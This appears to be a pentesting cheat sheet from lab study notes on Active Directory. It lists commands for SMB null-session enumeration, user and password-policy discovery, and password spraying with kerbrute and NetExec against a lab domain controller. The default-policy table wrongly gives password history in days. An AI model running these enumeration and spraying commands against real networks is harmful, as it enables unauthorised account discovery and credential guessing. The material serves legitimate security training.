**Overview:**
- SMB NULL sessions allow an unauthenticated attacker to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy.
- Password spraying involves attempting to log into an exposed service using one common password and a longer list of usernames or email addresses. 
- The default password policy when a new domain is created is as follows, and there have been plenty of organizations that never changed this policy:

|Policy|Default Value|
|---|---|
|Enforce password history|24 days|
|Maximum password age|42 days|
|Minimum password age|1 day|
|Minimum password length|7|
|Password must meet complexity requirements|Enabled|
|Store passwords using reversible encryption|Disabled|
|Account lockout duration|Not set|
|Account lockout threshold|0|
|Reset account lockout counter after|Not set|

---
## SMB Null Sessions

**Linux**

```
rpcclient -U "" -N 172.16.5.5
```

Connects via anonymous login to discover domain information through SMB null sessions.

```
querydominfo
```
Obtaining the Password Policy using rpcclient

**windows**

```
net use \\DC01\ipc$ "" /u:""
```


---
## User Enumeration

```
enum4linux -U 172.16.5.5 | grep "user:"
```

Enumerates user accounts, filtered through `grep` to show only users.

```
nxc smb 172.16.5.5 --users
```

Discovers users in the domain via NetExec.

---
## Password Policy

```
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

```
enum4linux -P 172.16.5.5
```

Enumerates the password policy on a target Windows domain.

```
nxc smb 172.16.5.5 -u <user> -p <password> --pass-pol
```

Enumerates the password policy using NetExec with valid credentials. `--pass-pol` retrieves policy.

---
## Password Spraying

```
kerbrute passwordspray -d <domain> --dc 172.16.5.5 valid_users.txt <password>
```

Sprays a single password against a list of valid users via Kerberos. `-d` domain, `--dc` DC IP. 

```
sudo nxc smb 172.16.5.5 -u valid_users.txt -p <password> | grep +
```

Same attack via NetExec from a Linux host. `grep +` filters out failed logons.